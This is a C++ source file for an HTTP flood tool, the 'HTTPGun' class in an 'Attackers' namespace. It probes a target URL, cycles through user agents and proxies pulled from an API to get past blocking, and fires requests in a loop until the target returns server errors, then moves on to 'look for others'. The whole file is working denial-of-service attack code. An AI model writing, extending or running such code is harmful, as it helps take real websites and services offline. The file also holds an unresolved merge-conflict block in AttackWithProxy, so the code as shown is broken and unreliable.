#include "spdlog/spdlog.h"

#include "http_gun.h"

#include "api_interface.h"
#include "utils.h"
#include "config.h"
#include "globals.h"

using namespace Attackers;
namespace spd = spdlog;

std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};

	prober.SetTarget(ProxyConfig::PROXY_PROBING);
	for(auto proxy : proxies)
	{
		prober.SetProxy(proxy.first, proxy.second);
		UpdateHeaders(headers, proxy.first);
		prober.SetHeaders(headers);

		if(const auto respCode{prober.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(*respCode >= 200 && *respCode < 300)
			{
				return proxy;
			}
			std::cerr << "Proxy: " << proxy.first << "@" << 
				proxy.second << " failed with code: " << *respCode << std::endl;
		}
		else
		{
			std::cerr << "Proxy: " << proxy.first << "@" << proxy.second << " failed" << std::endl;
		}
	}

	return {};
}

bool HTTPGun::SetValidProxy() noexcept
{
	Informator informer;
	size_t proxyTries{0};

	while(!m_currentTask.ShouldStop())
	{
		if(!informer.LoadNewData())
		{
			continue;
		}
		if(const auto proxies{informer.GetProxies()})
		{
			if(const auto proxy{ChoseProxy(*proxies)})
			{
				m_currentProxy = std::move(proxy);
				return true;
			}
			else
			{
				++proxyTries;
			}
		}
		if(proxyTries == ProxyConfig::PROXY_TRIES)
		{
			break;
		}
	}
	return false;
}

std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};
	// Trying to break through without proxy
	headers["User-Agent"] = ChoseUseragent();
	prober.SetHeaders(headers);
	prober.SetTarget(uriToAttack.GetFullURI());

	Headers receivedHeaders;

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS, &receivedHeaders)})
	{
		std::cout << "Got: " << *targetRespCode << " without proxy" << std::endl;
		if(*targetRespCode >= 200 && *targetRespCode < 400)
		{
			std::cout << "Firing without proxy" << std::endl;

			if(*targetRespCode >= 300)
			{
				const std::string locationString{"Location"};
				if(receivedHeaders.find(locationString) !=
					std::end(receivedHeaders))
				{
					return Target{receivedHeaders[locationString], 0};
				}
			}
			return Target{uriToAttack.GetFullURI(), 0};
		}
		else if(*targetRespCode >= 500)
		{
			return {};
		}
	}
	std::cout << "Failed to check host without proxy" << std::endl;
	// Trying to aim with proxy
	if(!SetValidProxy())
	{
		return {};
	}

	UpdateHeaders(headers, m_currentProxy->first);
	prober.SetHeaders(headers);

	prober.SetProxy(m_currentProxy->first, m_currentProxy->second);

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)}; 
		*targetRespCode >= 200 && *targetRespCode < 400)
	{
		std::cout << "Firing with proxy" << std::endl;
		return Target{uriToAttack.GetFullURI(), 0};
	}

	return {};
}

void HTTPGun::FireTillDead(const Target &targetToKill) noexcept
{
	if(!m_currentProxy)
	{

		spd::get("console")->info("Attacking without proxy");
		if(AttackWithNoProxy(targetToKill))
		{
			return;
		}
	}

	if(!m_currentTask.ShouldStop() && m_currentProxy)
	{
		spd::get("console")->info("Attacking with proxy");
		AttackWithProxy(targetToKill);
	}
	
}

bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
{
	Headers headers{CURLLoader::BASE_HEADERS};
	CURLLoader wrapper;

	size_t errorsCount{0};

	wrapper.SetTarget(targetToKill.address);

	auto console = spd::get("console");
	console->info("Starting attack without proxy at {}", targetToKill.address);
	while(!m_currentTask.ShouldStop())
	{
		headers["User-Agent"] = ChoseUseragent();
		wrapper.SetHeaders(headers);

		if(const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				return true;
			}
			else if(*respCode >= 200 && *respCode < 300)
			{
				std::cout << "Succesfuly attacked!" << std::endl;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				console->warn("Max errors count reached, retrying");
				return true;
			}
			else if(*respCode >= 500)
			{
				console->info("Target: {} is probably down, looking for others", targetToKill.address);
				return false;
			}
			console->info("Succesfully attacked {}", targetToKill.address);
		}
	}
	console->info("Attack without proxy finished");

	return false;
}

void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
{
	CURLLoader wrapper;
	Informator apiLoader;
	Headers headers{CURLLoader::BASE_HEADERS};

	wrapper.SetTarget(targetToKill.address);

	while(!m_currentTask.ShouldStop())
	{
		// Setting proxies
		std::cout << "Setting proxy" << std::endl;
		if(!m_currentProxy && !SetValidProxy())
		{
			return;
		}

		// Attacking
		std::cout << "Attacking" << std::endl;
		size_t errorsCount{0};
		for(size_t currentTry = 0; 
			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
		{
			UpdateHeaders(headers, m_currentProxy->first);
			wrapper.SetHeaders(headers);

			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
<<<<<<< HEAD
			if((!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT) || 
					g_shouldStop)
=======
			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
>>>>>>> fixes
			{
				break;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				std::cerr << "Target responded with not allowed code" << std::endl;
				break;
			}
			else if(*respCode >= 500)
			{
				std::cout << "Target: " << targetToKill.address << " is down, looking for others" << std::endl;
				return;
			}
		}
		std::cout << "Current proxy exhausted, looking for other" << std::endl;
		m_currentProxy = std::nullopt;
	}
}
